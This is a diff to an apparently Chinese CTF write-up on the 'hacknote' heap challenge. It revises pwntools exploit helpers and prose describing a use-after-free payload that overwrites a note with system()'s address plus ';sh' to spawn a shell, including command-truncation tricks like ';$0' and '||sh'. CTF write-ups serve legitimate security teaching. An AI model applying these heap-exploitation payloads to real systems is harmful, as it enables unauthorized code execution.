@@ -231,7 +231,7 @@ leak出free函数的地址后根据提供的目标系统libc文件便可以得�
 
     system_addr=read_addr-（libc_read_addr-libc_system_addr）
 
-得到system_addr后释放note（2）并重新申请新note写入system地址与参数，并调用puts执行system（这里有个限制，就是参数必须为4byte，但是/bin/sh有8byte，要用到system参数截断的姿势如 **“;$0”**  **“;sh”**  **“||sh”**） payload如下
+得到system_addr后释放note（2）并重新申请新note写入system地址与参数，并调用puts执行system，这里有个限制，就是参数必须为4byte，但是/bin/sh有8byte，要用到system参数截断的姿势如 **“;$0”**  **“;sh”**  **“||sh”** payload如下
 
 	delete(2)
 	add(8,p32(system_addr)+';sh')
@@ -242,30 +242,23 @@ leak出free函数的地址后根据提供的目标系统libc文件便可以得�
 	from pwn import *
 	
 	def add(size,data):
-	    p.recvuntil('Your choice ')
-	    p.recvuntil(':')
+	    p.recvuntil('Your choice :')
 	    p.sendline('1')     
-	    p.recvuntil('Note size ')
-	    p.recvuntil(':')
+	    p.recvuntil('Note size :')
 	    p.sendline(str(size))
-	    p.recvuntil('Content ')
-	    p.recvuntil(':')
+	    p.recvuntil('Content :')
 	    p.sendline(data)
 	 
 	def delete(index):
-	    p.recvuntil('Your choice ')
-	    p.recvuntil(':')
+	    p.recvuntil('Your choice :')
 	    p.sendline('2')
-	    p.recvuntil('Index ')
-	    p.recvuntil(':')
+	    p.recvuntil('Index :')
 	    p.sendline(str(index))
 	 
 	def puts(index):
-	    p.recvuntil('Your choice ')
-	    p.recvuntil(':')
+	    p.recvuntil('Your choice :')
 	    p.sendline('3')
-	    p.recvuntil('Index ')
-	    p.recvuntil(':')
+	    p.recvuntil('Index :')
 	    p.sendline(str(index))
 	
 	p=process('./hacknote')
